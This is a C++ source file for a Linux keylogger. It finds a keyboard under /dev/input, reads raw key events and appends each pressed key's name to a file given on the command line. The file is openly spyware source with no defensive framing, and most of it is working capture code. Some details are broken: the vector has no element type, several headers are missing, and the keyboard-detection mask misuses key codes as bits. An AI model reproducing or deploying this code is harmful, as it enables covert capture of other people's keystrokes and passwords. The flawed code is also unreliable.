#include <sys/stat.h>
#include <linux/input.h>
#include <vector>
#include <string>
#include <cstring>
#include <fstream>

std::vector keycodes = {
        "RESERVED",
        "ESC",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "0",
        "MINUS",
        "EQUAL",
        "BACKSPACE",
        "TAB",
        "Q",
        "W",
        "E",
        "R",
        "T",
        "Y",
        "U",
        "I",
        "O",
        "P",
        "LEFTBRACE",
        "RIGHTBRACE",
        "ENTER",
        "LEFTCTRL",
        "A",
        "S",
        "D",
        "F",
        "G",
        "H",
        "J",
        "K",
        "L",
        "SEMICOLON",
        "APOSTROPHE",
        "GRAVE",
        "LEFTSHIFT",
        "BACKSLASH",
        "Z",
        "X",
        "C",
        "V",
        "B",
        "N",
        "M",
        "COMMA",
        "DOT",
        "SLASH",
        "RIGHTSHIFT",
        "KPASTERISK",
        "LEFTALT",
        "SPACE",
        "CAPSLOCK",
        "F1",
        "F2",
        "F3",
        "F4",
        "F5",
        "F6",
        "F7",
        "F8",
        "F9",
        "F10",
        "NUMLOCK",
        "SCROLLLOCK"
};

int loop = 1;

void sigint_handler(int sig)
{
    loop = 0;
}

int write_all(int file_desc, const char *str)
{
    int bytesWritten = 0;
    int bytesToWrite = strlen(str);

    do
    {
        bytesWritten = write(file_desc, str, bytesToWrite);

        if(bytesWritten == -1)
        {
            return 0;
        }
        bytesToWrite -= bytesWritten;
        str += bytesWritten;
    } while(bytesToWrite > 0);

    return 1;
}

void safe_write_all(int file_desc, const char *str, int keyboard)
{
    struct sigaction new_actn, old_actn;
    new_actn.sa_handler = SIG_IGN;
    sigemptyset(&new_actn.sa_mask);
    new_actn.sa_flags = 0;

    sigaction(SIGPIPE, &new_actn, &old_actn);

    if(!write_all(file_desc, str))
    {
        close(file_desc);
        close(keyboard);
        std::cerr << "Error: " << strerror(errno) << std::endl;
        exit(1);
    }

    sigaction(SIGPIPE, &old_actn, NULL);
}

void keylogger(int keyboard, int writeout)
{
    int eventSize = sizeof(struct input_event);
    int bytesRead = 0;
    const unsigned int number_of_events = 128;
    struct input_event events[number_of_events];
    int i;

    signal(SIGINT, sigint_handler);

    while(loop)
    {
        bytesRead = read(keyboard, events, eventSize * number_of_events);

        for(i = 0; i < (bytesRead / eventSize); ++i)
        {
            if(events[i].type == EV_KEY)
            {
                if(events[i].value == 1)
                {
                    if(events[i].code > 0 && events[i].code < keycodes.size())
                    {
                        safe_write_all(writeout, keycodes[events[i].code].c_str(), keyboard);
                        safe_write_all(writeout, "\n", keyboard);
                    }
                    else
                    {
                        write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
                    }
                }
            }
        }
    }
    if(bytesRead > 0) safe_write_all(writeout, "\n", keyboard);
}

std::string get_kb_device()
{
    std::string kb_device = "";

    for (auto &p : std::filesystem::directory_iterator("/dev/input/"))
    {
        std::filesystem::file_status status = std::filesystem::status(p);

        if (std::filesystem::is_character_file(status))
        {
            std::string filename = p.path().string();
            int fd = open(filename.c_str(), O_RDONLY);
            if(fd == -1)
            {
                std::cerr << "Error: " << strerror(errno) << std::endl;
                continue;
            }

            int32_t event_bitmap = 0;
            int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

            ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
            if((EV_KEY & event_bitmap) == EV_KEY)
            {
                // The device acts like a keyboard

                ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
                if((kbd_bitmap & event_bitmap) == kbd_bitmap)
                {
                    // The device supports A, B, C, Z keys, so it probably is a keyboard
                    kb_device = filename;
                    close(fd);
                    break;
                }
            }
            close(fd);
        }
    }
    return kb_device;
}

void print_usage_and_quit(char *application_name)
{
    std::cout << "Usage: " << application_name << " output-file" << std::endl;
    exit(1);
}

int main(int argc, char *argv[])
{
    std::string kb_device = get_kb_device();

    if (argc < 2)
        print_usage_and_quit(argv[0]);

    if(kb_device == "")
        print_usage_and_quit(argv[0]);

    int writeout;
    int keyboard;

    if((writeout = open(argv[1], O_WRONLY|O_APPEND|O_CREAT, S_IROTH)) < 0)
    {
        std::cerr << "Error opening file " << argv[1] << ": " << strerror(errno) << std::endl;
        return 1;
    }

    if((keyboard = open(kb_device.c_str(), O_RDONLY)) < 0)
    {
        std::cerr << "Error accessing keyboard from " << kb_device << ". May require you to be superuser." << std::endl;
        return 1;
    }

    std::cout << "Keyboard device: " << kb_device << std::endl;
    keylogger(keyboard, writeout);

    close(keyboard);
    close(writeout);

    return 0;
}